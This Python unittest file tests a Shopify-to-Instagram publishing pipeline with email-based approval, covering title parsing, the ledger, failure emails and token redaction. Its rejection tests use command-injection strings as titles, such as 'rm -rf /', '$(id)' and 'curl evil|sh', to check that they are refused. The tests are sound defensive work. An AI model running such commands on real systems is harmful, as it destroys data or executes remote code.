import html
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import draft
import publish
from core import approval, http, ledger
from channels import instagram

os.environ.update(GITHUB_REPOSITORY="o/r", GITHUB_REF_NAME="main", RESEND_API_KEY="x" * 12,
                  RESEND_FROM="a@b.c", RESEND_TO="d@e.f")

ID = "752115122509"


def fake_update(mutator, message, extra_paths=(), attempts=4):
    data = ledger.load()
    mutator(data)
    ledger.save(data)
    return data


class InTmp(unittest.TestCase):
    def setUp(self):
        self._cwd = os.getcwd()
        self._tmp = tempfile.TemporaryDirectory()
        os.chdir(self._tmp.name)
        p = mock.patch.object(ledger, "update", fake_update)
        p.start()
        self.addCleanup(p.stop)
        self.addCleanup(self._tmp.cleanup)
        self.addCleanup(os.chdir, self._cwd)


class TitleParsing(unittest.TestCase):
    def test_valid(self):
        self.assertEqual(publish.parse_title(f"approve:{ID}:ig"), ("approve", ID, ["ig"]))
        self.assertEqual(publish.parse_title("approve:1:ig+fb")[2], ["ig", "fb"])
        self.assertEqual(publish.parse_title("reject:42:pin")[0], "reject")

    def test_rejects_everything_else(self):
        bad = [
            "", "approve:x:tiktok", "approve:my-post-1:ig",  # handles are no longer accepted
            "approve:gid://shopify/Article/1:ig", "approve:12 3:ig", f"approve:{ID}:ig\n",
            "approve:1:ig; rm -rf /", "approve:$(id):ig", "approve:1:ig`id`",
            "approve:1:ig\napprove:2:ig", "publish:1:ig", "approve::ig", "approve:١٢٣:ig",
        ]
        for title in bad:
            with self.assertRaises(ValueError, msg=title):
                publish.parse_title(title)

    def test_every_email_button_passes_the_workflow_regex(self):
        for action in ("approve", "reject"):
            link = approval.approval_link(action, ID, "ig")
            self.assertIn("labels=approval", link)
            self.assertIn(f"title={action}%3A{ID}%3Aig", link)
        self.assertIn("ig%2Bfb", approval.approval_link("approve", ID, "ig+fb"))

    def test_link_refuses_a_handle(self):
        with self.assertRaises(ValueError):
            approval.approval_link("approve", "bettwaesche-leinen", "ig")


class Ids(unittest.TestCase):
    def test_numeric_id(self):
        self.assertEqual(ledger.numeric_id("gid://shopify/Article/752115122509"), ID)
        self.assertEqual(ledger.numeric_id(ID), ID)


class Redaction(unittest.TestCase):
    def test_secret_values_never_survive(self):
        with mock.patch.dict(os.environ, {"ACCESS_TOKEN": "EAAB-secret-token-123"}):
            self.assertNotIn("secret-token", http.redact("GET https://x?access_token=EAAB-secret-token-123"))


class DraftSelection(InTmp):
    def art(self, i, handle, pub=True):
        return {"id": f"gid://shopify/Article/{i}", "handle": handle, "isPublished": pub}

    def test_skips_legacy_ledger_and_unpublished(self):
        arts = [self.art("1", "a"), self.art("2", "b"), self.art("3", "c"), self.art("4", "d", pub=False)]
        picked = draft.select_new_articles(arts, {"2": {"ig": {}}}, {"1"})
        self.assertEqual([a["handle"] for a in picked], ["c"])

    def test_renamed_handle_does_not_cause_a_redraft(self):
        arts = [self.art("2", "brand-new-handle")]
        self.assertEqual(draft.select_new_articles(arts, {"2": {"ig": {}}}, set()), [])

    def test_legacy_file_gids_are_compared_numerically(self):
        Path("state").mkdir()
        Path("state/legacy-ig-drafted-articles.json").write_text(
            json.dumps({"drafted_article_ids": ["gid://shopify/Article/7", "gid://shopify/Article/8"]}))
        self.assertEqual(ledger.legacy_drafted_ids(), {"7", "8"})


class Approve(InTmp):
    def seed(self, status="draft", **extra):
        ledger.save({ID: {"ig": {"status": status, "handle": "some-post", "article_id": ID,
                                 "post_id": None, "url": None, **extra}}})
        ledger.write_draft(ID, "ig", {"full_caption": "cap", "article_url": "https://u", "image_url": "i"})

    def test_publish_writes_ledger_and_is_idempotent(self):
        self.seed()
        fake = mock.Mock()
        fake.publish.return_value = {"post_id": "9", "url": "https://ig/p/9", "timestamp": "t"}
        fake.after_publish.return_value = "redirect ok"
        with mock.patch.dict(publish.CHANNELS, {"ig": fake}):
            line, ok = publish.do_approve(ID, "ig")
            self.assertTrue(ok)
            entry = ledger.load()[ID]["ig"]
            self.assertEqual((entry["status"], entry["post_id"], entry["url"]), ("published", "9", "https://ig/p/9"))
            self.assertEqual(entry["handle"], "some-post")  # display field survives
            line, ok = publish.do_approve(ID, "ig")  # second run
        self.assertTrue(ok)
        self.assertIn("already published", line)
        fake.publish.assert_called_once()

    def test_publishing_state_blocks_retry_and_explains_the_fix(self):
        self.seed("publishing", container_id="c1")
        fake = mock.Mock()
        with mock.patch.dict(publish.CHANNELS, {"ig": fake}):
            with self.assertRaises(publish.Blocked) as cm:
                publish.do_approve(ID, "ig")
        fake.publish.assert_not_called()
        self.assertIn(f'state/ledger.json -> "{ID}" -> "ig"', str(cm.exception))

    def test_rejected_and_unimplemented_raise(self):
        self.seed("rejected")
        fake = mock.Mock()
        with mock.patch.dict(publish.CHANNELS, {"ig": fake}):
            with self.assertRaises(publish.Blocked):
                publish.do_approve(ID, "ig")
        with self.assertRaises(publish.Blocked):
            publish.do_approve(ID, "fb")
        fake.publish.assert_not_called()

    def test_reject_marks_ledger_and_never_publishes(self):
        self.seed()
        publish.do_reject(ID, "ig")
        self.assertEqual(ledger.load()[ID]["ig"]["status"], "rejected")

    def test_reject_does_not_touch_published(self):
        self.seed("published", url="https://ig/p/1")
        publish.do_reject(ID, "ig")
        self.assertEqual(ledger.load()[ID]["ig"]["status"], "published")


class MainFlow(InTmp):
    env = {"TITLE": f"approve:{ID}:ig", "ACCESS_TOKEN": "bad-token-xxxx", "IG_USER_ID": "1",
           "SHOPIFY_STORE_DOMAIN": "s", "SHOPIFY_CLIENT_ID": "c", "SHOPIFY_CLIENT_SECRET": "s",
           "BIO_LINK_PATH": "/p"}

    def seed(self, status="draft", **extra):
        ledger.save({ID: {"ig": {"status": status, "handle": "some-post", "article_id": ID, **extra}}})
        ledger.write_draft(ID, "ig", {"full_caption": "c", "article_url": "u", "image_url": "i"})

    def run_main(self, **env):
        result = Path("result.md")
        with mock.patch.dict(os.environ, {**self.env, "RESULT_FILE": str(result), **env}), \
                mock.patch.object(approval, "_send") as send:
            with self.assertRaises(SystemExit):
                publish.main()
        return send, result.read_text(encoding="utf-8")

    def test_platform_error_sends_failure_email_with_raw_text_and_stays_draft(self):
        self.seed()
        err = http.ApiError('ig-create-container failed: HTTP 400: {"error":{"message":"Invalid OAuth access token"}}')
        with mock.patch.object(instagram, "create_container", side_effect=err), \
                mock.patch.object(approval, "_send") as send:
            with mock.patch.dict(os.environ, {**self.env, "RESULT_FILE": "result.md"}):
                with self.assertRaises(SystemExit):
                    publish.main()
        subject, body = send.call_args[0]
        self.assertIn("[FAILED]", subject)
        self.assertIn("Invalid OAuth access token", body)
        self.assertIn("Invalid OAuth access token", Path("result.md").read_text(encoding="utf-8"))
        self.assertEqual(ledger.load()[ID]["ig"]["status"], "draft")
        self.assertNotIn("LEDGER ENTRY TO FIX", body)

    def test_in_flight_failure_email_contains_the_exact_ledger_fix(self):
        self.seed()

        def publish_then_timeout(d, mark, revert):
            mark("container-77")
            raise TimeoutError("read timed out")

        fake = mock.Mock()
        fake.publish.side_effect = publish_then_timeout
        with mock.patch.dict(publish.CHANNELS, {"ig": fake}):
            send, result = self.run_main()
        _, body = send.call_args[0]
        self.assertEqual(ledger.load()[ID]["ig"]["status"], "publishing")
        for text in (html.unescape(body), result):
            self.assertIn(f'state/ledger.json -> "{ID}" -> "ig"', text)
        self.assertEqual(send.call_args[0][0], f"[FAILED] Publish failed (ig): {ID} (some-post)")
        self.assertIn("container-77", result)
        self.assertIn('"status": "published"', result)  # 2a: post is live
        self.assertIn('"status": "draft"', result)       # 2b: post is not live
        self.assertIn("<permalink of the post>", result)

    def test_blocked_retry_also_sends_the_failure_email_with_the_fix(self):
        self.seed("publishing", container_id="c1")
        with mock.patch.dict(publish.CHANNELS, {"ig": mock.Mock()}):
            send, result = self.run_main()
        send.assert_called_once()
        self.assertIn("LEDGER ENTRY TO FIX BY HAND", result)
        self.assertEqual(result.count("LEDGER ENTRY TO FIX BY HAND"), 1)  # not duplicated

    def test_unimplemented_channel_sends_failure_email(self):
        self.seed()
        send, _ = self.run_main(TITLE=f"approve:{ID}:fb")
        send.assert_called_once()

    def test_malicious_title_fails_before_any_work(self):
        with mock.patch.dict(os.environ, {**self.env, "TITLE": "approve:1:ig; curl evil|sh"}), \
                mock.patch.object(approval, "_send") as send:
            with self.assertRaises(SystemExit):
                publish.main()
        send.assert_not_called()


class InstagramPublish(unittest.TestCase):
    def test_definite_publish_error_reverts_but_ambiguous_does_not(self):
        env = {"ACCESS_TOKEN": "t" * 12, "IG_USER_ID": "1"}
        draft_ = {"full_caption": "c", "image_url": "i"}
        calls = []
        with mock.patch.dict(os.environ, env), \
                mock.patch.object(instagram, "create_container", return_value="c1"), \
                mock.patch.object(instagram, "wait_until_ready"), \
                mock.patch.object(http, "request", side_effect=http.ApiError("boom")):
            with self.assertRaises(http.ApiError):
                instagram.publish(draft_, lambda c: calls.append("mark"), lambda: calls.append("revert"))
        self.assertEqual(calls, ["mark", "revert"])

        calls.clear()
        with mock.patch.dict(os.environ, env), \
                mock.patch.object(instagram, "create_container", return_value="c1"), \
                mock.patch.object(instagram, "wait_until_ready"), \
                mock.patch.object(http, "request", side_effect=TimeoutError("read timed out")):
            with self.assertRaises(TimeoutError):
                instagram.publish(draft_, lambda c: calls.append("mark"), lambda: calls.append("revert"))
        self.assertEqual(calls, ["mark"])

    def test_build_draft_stores_numeric_id_and_handle_separately(self):
        d = instagram.build_draft(
            {"id": f"gid://shopify/Article/{ID}", "handle": "h", "title": "T"},
            "https://u", {"caption": "c", "hashtags": ["a"]}, "generated/ig-x.jpg", "https://i")
        self.assertEqual((d["article_id"], d["handle"]), (ID, "h"))


if __name__ == "__main__":
    unittest.main()
